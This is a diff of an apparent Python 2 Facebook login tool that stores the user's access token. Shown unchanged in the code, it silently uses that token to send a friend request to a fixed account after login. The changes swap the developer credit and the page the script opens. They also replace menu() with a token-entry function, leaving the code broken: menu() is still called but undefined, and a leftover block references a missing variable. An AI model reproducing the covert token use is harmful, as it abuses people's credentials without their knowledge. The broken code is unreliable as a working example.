@@ -263,7 +263,7 @@ def login1():
 				unikers.write(z['access_token'])
 				unikers.close()
 				print '\033[1;47m\033[1;91mLogin Successful\033[1;0m'
-				os.system('xdg-open https://www.youtube.com/channel/UCWLIAZHMlnlQMuMKTjBdbAQ')
+				os.system('xdg-open https://www.facebook.com/ham143mah')
 				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
 				menu()
 			except requests.exceptions.ConnectionError:
@@ -280,16 +280,27 @@ def login1():
 			time.sleep(1)
 			login()
 			
-def menu():
-	os.system('clear')
-	try:
-		toket=open('login.txt','r').read()
-	except IOError:
-		os.system('clear')
-		print"\x1b[1;94mToken invalid"
-		os.system('rm -rf login.txt')
-		time.sleep(1)
-		login()
+def log_token():
+
+    os.system('clear')
+
+    print logo
+
+    print '\x1b[1;93mLogin with token\x1b[1;91m'
+
+    print 47 * '-'
+
+    tok = raw_input(' \x1b[1;92mPaste token here: \x1b[1;91m')
+
+    print 47 * '-'
+
+    t_s = open('access_token.txt', 'w')
+
+    t_s.write(tok)
+
+    t_s.close()
+
+    menu()
 	try:
 		o = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(o.text)
@@ -307,7 +318,7 @@ def menu():
 	except requests.exceptions.ConnectionError:
 		print"\x1b[1;94mThere is no internet connection"
 		keluar()
-	os.system("clear") #Dev:Babar_Ali
+	os.system("clear") #Dev:Hamayun_Khan
 	print logo
 	print "\033[1;37m[!]\033[1;97m Logged in User Information\033[1;92m"
 	time.sleep(0.05)
